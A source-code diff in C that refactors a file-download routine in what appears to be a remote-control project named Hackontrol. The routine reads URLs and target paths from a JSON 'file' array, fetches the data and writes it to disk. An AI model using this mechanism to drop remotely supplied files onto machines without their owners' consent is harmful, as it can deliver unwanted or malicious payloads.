@@ -1,8 +1,8 @@
-#include "execute.h"
 #include <khopanstring.h>
+#include <hackontrolcurl.h>
+#include "execute.h"
 
 static void processFileEntry(cJSON* root);
-static size_t write_file(void* data, size_t size, size_t count, FILE* stream);
 
 void ProcessFilesArray(cJSON* root) {
 	if(!cJSON_HasObjectItem(root, "file")) {
@@ -48,39 +48,14 @@ static void processFileEntry(cJSON* root) {
 		goto freeFilePath;
 	}
 
-	CURL* curl = curl_easy_init();
+	DataStream stream = {0};
 
-	if(!curl) {
+	if(!HackontrolDownloadData(&stream, cJSON_GetStringValue(urlField), TRUE, NULL)) {
 		goto freeFilePath;
 	}
 
-	if(curl_easy_setopt(curl, CURLOPT_URL, cJSON_GetStringValue(urlField)) != CURLE_OK) {
-		goto easyCleanup;
-	}
-
-	if(curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_file) != CURLE_OK) {
-		goto easyCleanup;
-	}
-
-	FILE* file;
-
-	if(_wfopen_s(&file, filePath, L"wb") || !file) {
-		goto easyCleanup;
-	}
-
-	if(curl_easy_setopt(curl, CURLOPT_WRITEDATA, file) != CURLE_OK) {
-		goto closeFile;
-	}
-
-	curl_easy_perform(curl);
-closeFile:
-	fclose(file);
-easyCleanup:
-	curl_easy_cleanup(curl);
+	HackontrolWriteFile(filePath, &stream);
+	KHDataStreamFree(&stream);
 freeFilePath:
 	LocalFree(filePath);
-}
-
-static size_t write_file(void* data, size_t size, size_t count, FILE* stream) {
-	return fwrite(data, size, count, stream);
 }
